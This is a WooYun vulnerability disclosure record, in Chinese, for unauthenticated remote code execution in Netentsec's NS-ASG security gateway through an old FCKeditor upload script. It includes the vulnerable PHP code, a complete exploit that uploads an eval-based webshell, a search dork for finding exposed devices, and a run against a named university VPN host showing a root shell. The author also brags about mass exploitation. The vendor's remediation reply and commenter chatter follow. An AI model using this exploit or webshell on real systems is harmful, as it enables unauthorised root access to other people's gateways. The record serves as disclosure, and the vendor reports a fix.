{"id": 2607, "wybug_id": "wooyun-2014-058902", "wybug_title": "网康 NS-ASG 应用安全网关所有版本getshell", "wybug_corp": "网康科技", "wybug_author": "狗狗侠", "wybug_date": "2014-04-29 17:24", "wybug_open_date": "2014-07-28 17:26", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-28：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 第二弹了。。。。剑总，疯狗叔叔...求给力   详细说明：   无需登录，直接getshell。。。。太爽了...https://目标域名/admin/fckeditor/_whatsnew.html版本Version 2.4.3ps (乌云好像传不了图片了？)fckeditor在此版本下，可以任意上传文件，直接造成代码执行，我已经写好exp了漏洞点在/admin/fckeditor/editor/filemanager/upload/php/upload.php?type=Media\nrequire('config.php') ;require('util.php') ;// This is the function that sends the results of the uploading process.function SendResults( $errorNumber, $fileUrl = '', $fileName = '', $customMsg = '' ){\techo '<script type=\"text/javascript\">' ;\techo 'window.parent.OnUploadCompleted(' . $errorNumber . ',\"' . str_replace( '\"', '\\\\\"', $fileUrl ) . '\",\"' . str_replace( '\"', '\\\\\"', $fileName ) . '\", \"' . str_replace( '\"', '\\\\\"', $customMsg ) . '\") ;' ;\techo '</script>' ;\texit ;}// Check if this uploader has been enabled.if ( !$Config['Enabled'] )\tSendResults( '1', '', '', 'This file uploader is disabled. Please check the \"editor/filemanager/upload/php/config.php\" file' ) ;// Check if the file has been correctly uploaded.if ( !isset( $_FILES['NewFile'] ) || is_null( $_FILES['NewFile']['tmp_name'] ) || $_FILES['NewFile']['name'] == '' )\tSendResults( '202' ) ;// Get the posted file.$oFile = $_FILES['NewFile'] ;// Get the uploaded file name extension.$sFileName = $oFile['name'] ;// Replace dots in the name with underscores (only one dot can be there... security issue).//if ( $Config['ForceSingleExtension'] ) //change by linyh//\t$sFileName = preg_replace( '/\\\\.(?![^.]*$)/', '_', $sFileName ) ;$sOriginalFileName = $sFileName ;// Get the extension.$sExtension = substr( $sFileName, ( strrpos($sFileName, '.') + 1 ) ) ;$sExtension = strtolower( $sExtension ) ;// The the file type (from the QueryString, by default 'File').$sType = isset( $_GET['Type'] ) ? $_GET['Type'] : 'File' ;// Check if it is an allowed type.if ( !in_array( $sType, array('File','Image','Flash','Media') ) )    SendResults( 1, '', '', 'Invalid type specified' ) ;// Get the allowed and denied extensions arrays.$arAllowed\t= $Config['AllowedExtensions'][$sType] ;$arDenied\t= $Config['DeniedExtensions'][$sType] ;// Check if it is an allowed extension.if ( ( count($arAllowed) > 0 && !in_array( $sExtension, $arAllowed ) ) || ( count($arDenied) > 0 && in_array( $sExtension, $arDenied ) ) )\tSendResults( '202' ) ;$sErrorNumber\t= '0' ;$sFileUrl\t\t= '' ;// Initializes the counter used to rename the file, if another one with the same name already exists.$iCounter = 0 ;// Get the target directory.if ( isset( $Config['UserFilesAbsolutePath'] ) && strlen( $Config['UserFilesAbsolutePath'] ) > 0 )\t$sServerDir = $Config['UserFilesAbsolutePath'] ;else\t$sServerDir = GetRootPath() . $Config[\"UserFilesPath\"] ;exec(\"sudo chmod -R 777 \".$sServerDir);$sRootPath = $sServerDir;if ( $Config['UseFileType'] )\t$sServerDir .= strtolower($sType) . '/' ;//check for the directory before uploading the fileif(!is_dir($sServerDir)){    mkdir($sServerDir);} while ( true ){\t// Compose the file path.\t$sFilePath = $sServerDir . $sFileName ;\t// If a file with that name already exists.\tif ( is_file( $sFilePath ) )\t{\t\t$iCounter++ ;\t\t$sFileName = RemoveExtension( $sOriginalFileName ) . '(' . $iCounter . ').' . $sExtension ;\t\t$sErrorNumber = '201' ;\t}\telse\t{\t\tmove_uploaded_file( $oFile['tmp_name'],$sFilePath ) ;\t\tif ( is_file( $sFilePath ) )\t\t{\t\t\t$oldumask = umask(0) ;\t\t\tchmod( $sFilePath, 0777 ) ;\t\t\tumask( $oldumask ) ;\t\t}\t\tif ( $Config['UseFileType'] )\t\t\t$sFileUrl = $Config[\"UserFilesPath\"] . strtolower($sType) . '/' . $sFileName ;\t\telse\t\t\t$sFileUrl = $Config[\"UserFilesPath\"] . $sFileName ;\t\tbreak ;\t}}\n自己分析吧！ <2.4.3都有此问题了我已经写好exp了。。。可以批量拿网康应用网关的shell了，都是root。。。\n<?phpprint_r('      +--------------------------------------------------------------+                  NS-ASG Getshell  Exploit      +--------------------------------------------------------------+');if ($argc < 2) {      print_r('      +--------------------------------------------------------------+                  Example:                  php '.$argv[0].' localhost      +--------------------------------------------------------------+      ');      exit;}$host = $argv[1];$file = 'index.php';$path = \"/admin/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media\";$url = 'https://'.$host.$path;$fp = fopen(\"$file\",\"w\") or die('can not write');fwrite($fp,\"<?php phpinfo();eval(\\$_POST[cmd]);?>\");fclose($fp);$data = array('NewFile'=>'@'. dirname(__FILE__).\"/$file\");\t$curl = curl_init(); \tcurl_setopt ( $curl, CURLOPT_URL, $url ); // \tcurl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, 0 ); \tcurl_setopt ( $curl, CURLOPT_SSL_VERIFYHOST, 0 ); \tcurl_setopt ( $curl, CURLOPT_USERAGENT, \"Mozilla/4.0\" ); \t@curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, 1 ); \tcurl_setopt ( $curl, CURLOPT_AUTOREFERER, 1 ); \tcurl_setopt ( $curl, CURLOPT_POST, 1 ); \tcurl_setopt ( $curl, CURLOPT_POSTFIELDS, $data ); \t\tcurl_setopt ( $curl, CURLOPT_TIMEOUT, 120 ); \tcurl_setopt ( $curl, CURLOPT_HEADER, 0 ); \tcurl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 );\t$tmpInfo = curl_exec ( $curl ); \tif (curl_errno ( $curl )) {\t\techo 'Errno' . curl_error ( $curl );\t}\tcurl_close ( $curl );    //echo $tmpInfo;\t    preg_match('/201,\\\"(.*)\\\",\\\"/iU',$tmpInfo,$matchs);\t$url = 'https://'.$host.$matchs[1];\tprint 'Shell: '.$url.'   password: cmd';\n谷歌稍微找下吧 intitle:网康 NS-ASG 应用安全网关G:\\wamp\\php>php wk.php vpn.lib.tju.edu.cn锘      +--------------------------------------------------------------+                  NS-ASG Getshell  Exploit      +--------------------------------------------------------------+Shell: https://vpn.lib.tju.edu.cn/vpnweb/userfiles/media/index(3).php   password: cmd都是root 。。   漏洞证明：  [/Isc/third-party/httpd/htdocs/vpnweb/userfiles/media/]$ ls -ltotal 16-rwxr-xr-x 1 root daemon 36 Apr 29 02:21 2.php-rwxr-xr-x 1 root daemon 36 Apr 29 15:27 35.php-rwxr-xr-x 1 root daemon 36 Apr 29 15:30 36.php-rwxr-xr-x 1 root daemon 36 Apr 29 16:50 index.php[/Isc/third-party/httpd/htdocs/vpnweb/userfiles/media/]$ whoamiroot[/Isc/third-party/httpd/htdocs/vpnweb/userfiles/media/]$    修复方案：  修复修复。。。准备再来一蛋   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-01 22:01 厂商回复： 4月29日，网康收到CNVD漏洞细节通知，迅速启动并同时展开了以下工作：1.进一步验证漏洞细节，目前已确认所曝漏洞确实存在于ASG产品；2.对全线产品进行安全自查，重点确认ASG产品是否仍存其它未知漏洞，并验证类似漏洞是否同存于其它产品线，截至目前，自查工作仍在进行中，全线产品暂未发现新的漏洞；3.开发用于漏洞修补的更新程序，将尽快发布应急补丁包，介时用户可通过操作设备管理界面直接安装该更新程序以对所曝漏洞进行应急性修补；4.售后服务部通过内部CRM系统导出全部ASG用户名单，并开始逐一联系用户通报漏洞情况，补丁包发布后，将再次逐一通知所有用户及时安装更新，此项工作预计3工作日内完成；5.为避免统计疏漏，工程部于4月30日16:00向CNVD共享了在线ASG设备的辨识方法，将配合CNVD共同开展在线设备的主动探测工作，一旦发现未更新补丁的在线设备，将联系并协助用户及时更新，此项工作预计10工作日内完成；6.将尽快向社会开放漏洞提交邮箱，接受第三方机构、白帽子及其它组织、个人向网康提交产品漏洞，向所有帮助网康产品进步的组织和人士表示感谢。 最新状态： 2014-07-17：已随版本更新解决  ", "replys": "漏洞评价：\n评论\n     2014-04-29 17:25 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-04-29 17:25 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  http://loudong.360.cn/vul/info/id/5942    \n     2014-04-29 17:25 |    \t\tkgra \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | 一波还未平息，一波洞又来袭)\t\t \n  这是要取消网康51放假的节奏啊    \n     2014-04-29 17:26 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @U神 未同意360估价....    \n     2014-04-29 17:26 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @U神 我本来想提给360,但是360价格不给力，我放弃了，请看他的状态你就知道了。    \n     2014-04-29 17:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @狗狗侠 何必呢...    \n     2014-04-29 17:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @狗狗侠 直接来不就行鸟 就不看心情了  一样的啊    \n     2014-04-29 17:29 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @xsser 恩，现在准备搞个一季度网康吧，剑总，求给力啊。。。哈哈。。    \n     2014-04-29 17:30 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @xsser 不过360是2000 我直接拒了它    \n     2014-04-29 17:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @狗狗侠 嘿嘿 懂    \n     2014-04-29 17:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @狗狗侠  不错呀。众测欢迎你。 还有必要去数字平台么    \n     2014-04-29 17:33 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  有源码可以哦。    \n     2014-04-29 17:34 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @zeracker 哥你去乌云了？    \n     2014-04-29 18:11 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @狗狗侠 乌云预计能拿到多少呢    \n     2014-04-29 19:18 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  @wefgod 301怎么成你哥了。    \n     2014-04-29 23:31 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @wefgod @园长 301不是妹子么 103才是汉字    \n     2014-04-30 10:49 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  @小胖胖要减肥 小胖多多~    \n     2014-04-30 11:58 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @园长 随便称呼一下而已……301？园长也是哥。    \n     2014-05-11 22:13 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @wefgod — —    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}